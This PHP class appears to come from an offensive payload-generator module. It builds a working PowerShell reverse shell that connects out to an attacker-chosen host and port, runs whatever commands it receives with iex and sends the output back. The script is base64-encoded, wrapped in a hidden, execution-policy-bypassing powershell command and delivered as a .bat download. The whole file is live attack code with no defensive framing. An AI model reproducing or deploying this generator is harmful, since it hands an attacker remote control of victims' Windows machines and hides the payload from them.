<?php
namespace App\Modules\PayloadGenerator;

class WindowsBuilder extends Builder
{
    public function generate(): string
    {
        // For demo, generate a PowerShell reverse shell base64-encoded
        $psScript = "\$client = New-Object System.Net.Sockets.TCPClient('{$this->lhost}',{$this->lport});" .
                    "\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};" .
                    "while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" .
                    "\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);" .
                    "\$sendback = (iex \$data 2>&1 | Out-String );" .
                    "\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';" .
                    "\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" .
                    "\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};" .
                    "\$client.Close()";
        $encoded = base64_encode($psScript);
        $payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " . $encoded;
        // For Windows EXE stub, we could embed this in a compiled binary, but we'll keep it as a .bat for demo.
        return $payload;
    }

    public function getFileExtension(): string { return 'bat'; }
    public function getMimeType(): string { return 'application/x-msdownload'; }
}
